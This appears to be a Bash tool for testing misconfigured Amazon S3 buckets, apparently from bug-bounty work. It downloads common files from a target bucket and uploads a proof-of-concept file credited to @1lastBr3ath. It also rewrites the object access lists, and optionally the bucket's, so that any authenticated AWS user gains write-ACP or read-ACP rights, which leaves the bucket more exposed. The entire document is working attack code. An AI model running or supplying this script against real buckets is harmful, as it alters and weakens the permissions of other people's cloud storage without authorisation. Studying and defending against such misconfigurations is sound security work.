#!/usr/bin/env bash

_read_ () {
  while read -r OBJECT; do {
    read_object "$1" "$OBJECT"
    get_object_acl "$1" "$OBJECT"
    set_object_acl "$1" "$OBJECT"
  } &
  done <<-'EOL'
  index.html
  index.php
  README
  README.md
  README.txt
  readme.html
  INSTALL.md
  INSTALL.txt
  CHANGELOG.md
  LICENSE
  Dockerfile
  version.php
  version.txt
  style.css
  script.js
EOL
}

_write_ () {
  POC_FILE=poc-"$(date +%s)".js
  echo 'Uplaod POC by @1lastBr3ath' > "$POC_FILE"
  aws s3api put-object --bucket "$1" --key "$POC_FILE" --body "$POC_FILE"
  rm -f "$POC_FILE"
}

read_object () {
  aws s3api get-object --bucket "$1" --key "$2" "$1/$2"
}

get_bucket_acl () {
  aws s3api get-bucket-acl --bucket "$1"
}

set_bucket_acl () {
  aws s3api put-bucket-acl --bucket "$1" --grant-read-acp uri=http://acs.amazonaws.com/groups/global/AuthenticatedUsers
}

get_object_acl () {
  aws s3api get-object-acl --bucket "$1" --key "$2"
}

set_object_acl () {
  aws s3api put-object-acl --bucket "$1" --key "$2" --grant-write-acp uri=http://acs.amazonaws.com/groups/global/AuthenticatedUsers
}

list_objects () {
  aws s3api list-objects --bucket "$1" --max-items 10 \
  --query 'Contents[].Key' | jq -r '.[]?' | tee "$1/$1"-listings.txt \
  | while read -r OBJECT; do
    set_object_acl "$1" "$OBJECT" &
  done < "$1/$1"-listings.txt
}

BUCKET_NAME="$1"
[ ! -d "$2" ] && mkdir "$BUCKET_NAME"

ERROR_LOG=/tmp/"$BUCKET_NAME".log
SUCCESS_LOG="$BUCKET_NAME/$BUCKET_NAME".log

{
  list_objects "$BUCKET_NAME"
  
  _read_ "$BUCKET_NAME"
  _write_ "$BUCKET_NAME"
  
  get_bucket_acl "$BUCKET_NAME"
  [[ "${@: -1}" =~ all|--all ]] &&  set_bucket_acl "$BUCKET_NAME"
} 2> "$ERROR_LOG" | tee -a "$SUCCESS_LOG"

find "$BUCKET_NAME" -empty -delete
